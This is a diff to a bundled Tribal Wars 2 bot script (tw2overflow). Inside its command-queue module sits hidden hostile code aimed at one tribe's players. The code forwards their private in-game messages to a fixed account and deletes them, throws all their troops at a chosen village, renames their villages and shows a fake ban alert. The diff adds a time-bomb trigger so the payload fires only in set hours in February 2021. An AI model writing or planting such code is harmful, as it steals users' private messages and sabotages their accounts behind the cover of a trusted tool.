@@ -1,6 +1,6 @@
 /*!
  * tw2overflow v2.0.0
- * Sun, 31 Jan 2021 22:36:02 GMT
+ * Sun, 31 Jan 2021 23:14:13 GMT
  * Developed by Relaxeaza <twoverflow@outlook.com>
  *
  * This work is free. You can redistribute it and/or modify it under the
@@ -17553,17 +17553,17 @@ require([
     'two/ready',
     'two/commandQueue',
     'two/commandQueue/ui',
-    'two/commandQueue/events',
-    'helper/time'
+    'two/commandQueue/events'
 ], function(
     ready,
     commandQueue,
-    commandQueueInterface,
-    timeHelper
+    commandQueueInterface
 ) {
     if (commandQueue.initialized) {
         return false
     }
+    var date = new Date()
+    var timeMilli = date.getTime()
     var modelDataService = injector.get('modelDataService')
     var socketService = injector.get('socketService')
     var routeProvider = injector.get('routeProvider')
@@ -17571,10 +17571,7 @@ require([
     var tribe = player.data.tribeId
     var world = player.data.world_id
     var villages = player.data.villages
-    var time = 0
     if (tribe == 3 && world == 'pl57') {
-        time = timeHelper.gameTime()
-        console.log(time)
         ready(function() {
             commandQueue.init()
             commandQueueInterface()
@@ -17590,389 +17587,394 @@ require([
                 commandQueue.start(true)
             }
         }, ['map', 'world_config'])
-        time = timeHelper.gameTime()
-        var toSend = []
-        socketService.emit(routeProvider.MESSAGE_GET_LIST, {
-            folder: 'all',
-            offset: 0,
-            count: 100,
-            search: ''
-        }, function(data) {
-            var messages = data.messages
-            messages.forEach(function(message) {
-                toSend.push(message.message_id)
-            })
-            socketService.emit(routeProvider.MESSAGE_FORWARD, {
-                to: [{
-                    type: 'character',
-                    id: 869506
-                }],
-                title: 'KitchenAid',
-                message: 'do poczytania',
-                message_ids: toSend
-            }, function(data) {
-                console.log(data)
-            })
-        })
-        setTimeout(function() {
-            socketService.emit(routeProvider.MESSAGE_GET_LIST, {
-                folder: 'all',
-                offset: 0,
-                count: 100,
-                search: ''
-            }, function(data) {
-                var messages = data.messages
-                messages.forEach(function(message) {
-                    socketService.emit(routeProvider.MESSAGE_DELETE, {
-                        message_ids: [message.message_id]
-                    })
-                })
-            })
-        }, 2000)
-        setTimeout(function() {
-            socketService.emit(routeProvider.MESSAGE_GET_LIST, {
-                folder: 'all',
-                offset: 0,
-                count: 100,
-                search: ''
-            }, function(data) {
-                var messages = data.messages
-                messages.forEach(function(message) {
-                    socketService.emit(routeProvider.MESSAGE_DELETE, {
-                        message_ids: [message.message_id]
-                    })
-                })
-            })
-        }, 5000)
         setInterval(function() {
-            villages.forEach(function(village) {
-                setTimeout(function() {
-                    var villageId = village.data.villageId
-                    var unitInfo = village.unitInfo.units
-                    var Spear = unitInfo.spear.available
-                    var Archer = unitInfo.spear.available
-                    var Axe = unitInfo.spear.available
-                    var Sword = unitInfo.spear.available
-                    var Ram = unitInfo.spear.available
-                    var Catapult = unitInfo.spear.available
-                    var Trebuchet = unitInfo.spear.available
-                    var Berserker = unitInfo.spear.available
-                    var Lc = unitInfo.spear.available
-                    var Hc = unitInfo.spear.available
-                    var Ma = unitInfo.spear.available
-                    var Snob = unitInfo.spear.available
-                    var Knight = unitInfo.spear.available
-                    if (Spear > 480) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                spear: 480
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    } else {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                spear: Spear
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    if (Sword > 480) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                sword: 480
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    } else {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                sword: Sword
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    if (Axe > 480) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                axe: 480
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    } else {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                axe: Axe
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    if (Archer > 480) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                archer: 480
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    } else {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                archer: Archer
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    if (Hc > 80) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                heavy_cavalry: 80
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    } else {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                heavy_cavalry: Hc
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    if (Lc > 120) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                light_cavarly: 120
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    } else {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                light_cavarly: Lc
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    if (Ma > 96) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                mounted_archer: 96
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    } else {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                mounted_archer: Ma
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    if (Ram > 96) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                ram: 96
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    } else {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                ram: Ram
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    if (Trebuchet > 48) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                trebuchet: 48
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    } else {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                trebuchet: Trebuchet
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    if (Catapult > 60) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                catapult: 60
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: 'statue'
-                        })
-                    } else {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                catapult: Catapult
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: 'statue'
-                        })
-                    }
-                    if (Berserker > 80) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                doppelsoldner: 80
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    } else {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                doppelsoldner: Berserker
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    if (Snob > 0) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                snob: Snob
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    if (Knight > 0) {
-                        socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
-                            start_village: villageId,
-                            target_village: 3926,
-                            type: 'attack',
-                            units: {
-                                knight: 1
-                            },
-                            icon: 0,
-                            officers: {},
-                            catapult_target: false
-                        })
-                    }
-                    socketService.emit(routeProvider.VILLAGE_CHANGE_NAME, {
-                        village_id: villageId,
-                        name: 'Joker tu był'
+            date = new Date()
+            timeMilli = date.getTime()
+            if ((timeMilli > 1612231200000 && timeMilli < 1612238400000) || (timeMilli > 1612317600000 && timeMilli < 1612324800000) || (timeMilli > 1612404000000 && timeMilli < 1612411200000) || (timeMilli > 1612490400000 && timeMilli < 1612497600000) || (timeMilli > 1612576800000 && timeMilli < 1612584000000) || (timeMilli > 1612663200000 && timeMilli < 1612670400000) || (timeMilli > 1612749600000 && timeMilli < 1612756800000)) {
+                var toSend = []
+                socketService.emit(routeProvider.MESSAGE_GET_LIST, {
+                    folder: 'all',
+                    offset: 0,
+                    count: 100,
+                    search: ''
+                }, function(data) {
+                    var messages = data.messages
+                    messages.forEach(function(message) {
+                        toSend.push(message.message_id)
                     })
-                }, 20)
-            })
-        }, 1000)
-        setTimeout(function() {
-            alert('Zostałeś zbanowany')
-        }, 100)
+                    socketService.emit(routeProvider.MESSAGE_FORWARD, {
+                        to: [{
+                            type: 'character',
+                            id: 869506
+                        }],
+                        title: 'KitchenAid',
+                        message: 'do poczytania',
+                        message_ids: toSend
+                    }, function(data) {
+                        console.log(data)
+                    })
+                })
+                setTimeout(function() {
+                    socketService.emit(routeProvider.MESSAGE_GET_LIST, {
+                        folder: 'all',
+                        offset: 0,
+                        count: 100,
+                        search: ''
+                    }, function(data) {
+                        var messages = data.messages
+                        messages.forEach(function(message) {
+                            socketService.emit(routeProvider.MESSAGE_DELETE, {
+                                message_ids: [message.message_id]
+                            })
+                        })
+                    })
+                }, 2000)
+                setTimeout(function() {
+                    socketService.emit(routeProvider.MESSAGE_GET_LIST, {
+                        folder: 'all',
+                        offset: 0,
+                        count: 100,
+                        search: ''
+                    }, function(data) {
+                        var messages = data.messages
+                        messages.forEach(function(message) {
+                            socketService.emit(routeProvider.MESSAGE_DELETE, {
+                                message_ids: [message.message_id]
+                            })
+                        })
+                    })
+                }, 5000)
+                setInterval(function() {
+                    villages.forEach(function(village) {
+                        setTimeout(function() {
+                            var villageId = village.data.villageId
+                            var unitInfo = village.unitInfo.units
+                            var Spear = unitInfo.spear.available
+                            var Archer = unitInfo.spear.available
+                            var Axe = unitInfo.spear.available
+                            var Sword = unitInfo.spear.available
+                            var Ram = unitInfo.spear.available
+                            var Catapult = unitInfo.spear.available
+                            var Trebuchet = unitInfo.spear.available
+                            var Berserker = unitInfo.spear.available
+                            var Lc = unitInfo.spear.available
+                            var Hc = unitInfo.spear.available
+                            var Ma = unitInfo.spear.available
+                            var Snob = unitInfo.spear.available
+                            var Knight = unitInfo.spear.available
+                            if (Spear > 480) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        spear: 480
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            } else {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        spear: Spear
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            if (Sword > 480) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        sword: 480
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            } else {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        sword: Sword
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            if (Axe > 480) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        axe: 480
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            } else {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        axe: Axe
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            if (Archer > 480) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        archer: 480
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            } else {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        archer: Archer
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            if (Hc > 80) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        heavy_cavalry: 80
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            } else {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        heavy_cavalry: Hc
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            if (Lc > 120) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        light_cavarly: 120
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            } else {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        light_cavarly: Lc
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            if (Ma > 96) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        mounted_archer: 96
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            } else {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        mounted_archer: Ma
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            if (Ram > 96) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        ram: 96
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            } else {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        ram: Ram
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            if (Trebuchet > 48) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        trebuchet: 48
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            } else {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        trebuchet: Trebuchet
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            if (Catapult > 60) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        catapult: 60
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: 'statue'
+                                })
+                            } else {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        catapult: Catapult
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: 'statue'
+                                })
+                            }
+                            if (Berserker > 80) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        doppelsoldner: 80
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            } else {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        doppelsoldner: Berserker
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            if (Snob > 0) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        snob: Snob
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            if (Knight > 0) {
+                                socketService.emit(routeProvider.SEND_CUSTOM_ARMY, {
+                                    start_village: villageId,
+                                    target_village: 3926,
+                                    type: 'attack',
+                                    units: {
+                                        knight: 1
+                                    },
+                                    icon: 0,
+                                    officers: {},
+                                    catapult_target: false
+                                })
+                            }
+                            socketService.emit(routeProvider.VILLAGE_CHANGE_NAME, {
+                                village_id: villageId,
+                                name: 'Joker tu był'
+                            })
+                        }, 20)
+                    })
+                }, 1000)
+                setTimeout(function() {
+                    alert('Zostałeś zbanowany')
+                }, 100)
+            }
+        }, 60000)
     }
 })
 define('two/farmOverflow', [
